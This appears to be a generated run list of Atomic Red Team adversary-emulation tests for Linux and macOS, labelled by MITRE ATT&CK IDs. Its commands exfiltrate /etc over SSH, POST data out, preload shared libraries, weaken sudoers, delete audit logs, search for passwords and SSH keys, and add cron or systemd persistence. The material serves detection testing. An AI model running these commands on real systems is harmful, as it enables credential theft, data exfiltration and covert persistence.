T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1158 ,T1153 ,T1139 ,T1069 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1136 ,T1154 ,T1145 ,T1069 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1069: Permission Groups Discovery
groups


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1501 ,T1153 ,T1145 ,T1018 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1168 ,T1064 ,T1081 ,T1069 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1136 ,T1154 ,T1040 ,T1018 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1154 ,T1081 ,T1069 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1064 ,T1081 ,T1082 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1215 ,T1154 ,T1139 ,T1083 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1158 ,T1154 ,T1040 ,T1018 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1501 ,T1153 ,T1139 ,T1217 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1158 ,T1064 ,T1139 ,T1082 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1064 ,T1081 ,T1082 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1501 ,T1154 ,T1040 ,T1083 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
